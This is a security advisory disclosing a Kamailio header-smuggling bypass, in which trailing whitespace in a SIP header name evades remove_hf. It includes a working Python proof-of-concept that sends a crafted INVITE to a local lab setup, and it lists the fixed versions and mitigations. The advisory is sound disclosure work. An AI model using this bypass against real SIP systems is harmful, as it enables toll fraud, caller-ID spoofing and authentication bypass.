# Kamailio vulnerable to header smuggling possible due to bypass of remove_hf

- Fixed versions: Kamailio v5.4.0
- Enable Security Advisory: <https://github.com/EnableSecurity/advisories/tree/master/ES2020-01-kamailio-remove-hf>
- Tested vulnerable versions: 5.3.5 and earlier
- Timeline:
    - Report date & issue patched by Kamailio:  2020-07-16
    - Kamailio rewrite for header parser (better fix): 2020-07-16 to 2020-07-23
    - Kamailio release with fix: 2020-07-29
    - Enable Security advisory: 2020-09-01

## Description

Kamailio is often configured to remove certain special internal SIP headers from untrusted traffic to protect against header injection attacks by making use of the `remove_hf` function from the Kamailio `textops` module. These SIP headers were typically set through Kamailio which are then used downstream, e.g. by a media service based on Asterisk, to affect internal business logic decisions. During our tests and research, we noticed that the removal of these headers can be bypassed by injecting whitespace characters at the end of the header name.

Further discussion and details of this vulnerability can be found at the Communication Breakdown blog: https://www.rtcsec.com/2020/09/01-smuggling-sip-headers-ftw/.

## Impact

The impact of this security bypass greatly depends on how these headers are used and processed by the affected logic. In a worst case scenarios, this vulnerability could allow toll fraud, caller-ID spoofing and authentication bypass.

## How to reproduce the issue

We prepared a docker-compose environment to demonstrate a vulnerable setup which can be found at <https://github.com/EnableSecurity/advisories/tree/master/ES2020-09-kamailio-remove-hf/repro>. The following python code could then be used to reproduce the issue:

```python
#!/usr/bin/env python3
sipmsg  = "INVITE sip:headerbypass@localhost SIP/2.0\r\n"
sipmsg += "Via: SIP/2.0/UDP 127.0.0.1:48017;rport;branch=z9hG4bK-%s\r\n"
sipmsg += "Max-Forwards: 70\r\n"
sipmsg += "From: <sip:anon@localhost>;tag=%s\r\n"
sipmsg += "To: sip:whatever@whatever.local\r\n"
sipmsg += "Call-ID: %s\r\n"
sipmsg += "CSeq: 1 INVITE\r\n"
sipmsg += "Contact: <sip:1000@127.0.0.1:48017;transport=udp>\r\n"
sipmsg += "X-Bypass-me : lol\r\n"
sipmsg += "Content-Length: 237\r\n"
sipmsg += "Content-Type: application/sdp\r\n"
sipmsg += "\r\n"
sipmsg += "v=0\r\n"
sipmsg += "o=- 1594727878 1594727878 IN IP4 127.0.0.1\r\n"
sipmsg += "s=-\r\n"
sipmsg += "c=IN IP4 127.0.0.1\r\n"
sipmsg += "t=0 0\r\n"
sipmsg += "m=audio 58657 RTP/AVP 0 8 96 101\r\n"
sipmsg += "a=rtpmap:101 telephone-event/8000/1\r\n"
sipmsg += "a=rtpmap:0 PCMU/8000/1\r\n"
sipmsg += "a=rtpmap:8 PCMA/8000/1\r\n"
sipmsg += "a=rtpmap:96 opus/8000/2\r\n"
sipmsg += "a=sendrecv\r\n"

target = ("127.0.0.1",5060)

import socket
import time
from random import randint
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
s.bind(("0.0.0.0",5088))
r = randint(1000,9999)
data = sipmsg % (r,r,r)
s.sendto(data.encode("utf-8"), target)
while True:
    data,addr=s.recvfrom(4096)
    print(data.decode("utf-8"))
    time.sleep(5)
```

In the case of a vulnerable version of Kamailio, Asterisk would respond with a 200 OK while in a fix version, you would get a 603 Decline response.

## Solutions and recommendations

The official Kamailio fix has been tested and found to sufficiently address this security flaw. We recommend making use of the latest release or backporting the fixes where possible. Making use of regular expressions to cover white-space characters with `remove_hf_re` has been suggested as mitigation for this issue for cases where the code cannot be upgraded.

Enable Security would like to thank Daniel-Constantin Mierla of the Kamailio Project for the very quick response and fix within minutes of our report being made available to him, as well as Torrey Searle for reporting this issue quickly to the Kamailio team.

## About Enable Security

[Enable Security](https://www.enablesecurity.com) develops offensive security tools and provides quality penetration testing to help protect your real-time communications systems against attack.

## Disclaimer

The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.

## Disclosure policy

This report is subject to Enable Security's vulnerability disclosure policy which can be found at <https://github.com/EnableSecurity/Vulnerability-Disclosure-Policy>.

